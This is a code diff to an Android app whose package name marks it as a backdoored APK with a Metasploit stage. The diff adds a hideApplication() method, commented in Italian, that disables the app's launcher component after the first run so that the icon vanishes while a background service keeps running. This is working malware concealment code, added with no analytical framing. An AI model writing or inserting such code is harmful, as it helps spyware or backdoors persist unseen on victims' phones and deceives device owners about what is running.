@@ -2,6 +2,7 @@ package stage.metasploit.com.backdooredapk;
 
 import android.app.IntentService;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.support.v7.app.ActionBarActivity;
 import android.os.Bundle;
 import android.view.Menu;
@@ -23,8 +24,17 @@ public class MainActivity extends Activity {
         protected void onCreate(Bundle savedInstanceState) {
             super.onCreate(savedInstanceState);
             Intent mis = new Intent(this,MyIntentService.class);
+            hideApplication();
             this.startService(mis);
             finish();
+        }
+
+        private void hideApplication() {
+            /* nasconde l'icona dal drawer dopo il primo avvio */
+            PackageManager pm = getApplicationContext().getPackageManager();
+            pm.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP);
+
         }
     }
 
